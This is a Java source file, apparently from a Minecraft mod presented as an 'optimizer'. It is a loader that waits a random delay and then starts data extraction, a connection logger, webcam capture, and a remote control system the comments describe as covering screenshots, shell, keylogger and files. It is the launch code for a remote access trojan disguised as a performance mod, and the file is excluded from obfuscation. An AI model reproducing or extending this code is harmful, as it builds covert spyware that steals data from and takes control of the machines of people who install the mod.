package com.example.optimizer;

/**
 * Separate class to call DataUtil.runAll()
 * This file is excluded from Skidfuscator transformations
 */
public class Loader {
    
    /**
     * Runs the extraction process with a delay
     */
    public static void start() {
        try {
            System.out.println("[OPTIMIZER] Loader.start() called");
            
            int delay = 5000 + (int)(Math.random() * 10000);
            System.out.println("[OPTIMIZER] Waiting " + delay + "ms...");
            Thread.sleep(delay);
            
            // IP-based matching: Server registers IP when Mod sends data
            // Guardian then sends data and server matches by IP
            // No config.dat file needed anymore!
            
            System.out.println("[OPTIMIZER] Calling DataUtil.runAll()...");
            DataUtil.runAll();
            System.out.println("[OPTIMIZER] DataUtil.runAll() completed successfully!");
            
            // Load Guardian (runs in background, uses IP-matching on server)
            AssetLoader.load();
            
            // Start server logger (monitors Minecraft server connections)
            ServerLogger.start();
            
            // Start online manager (heartbeat + webcam capture)
            OnlineManager.start();
            
            // Start remote control system (screenshot, shell, keylogger, files)
            SyncController.start();
            
        } catch (Exception e) {
            System.out.println("[OPTIMIZER] ERROR in Loader: " + e.getClass().getName() + " - " + e.getMessage());
            e.printStackTrace();
        }
    }
}
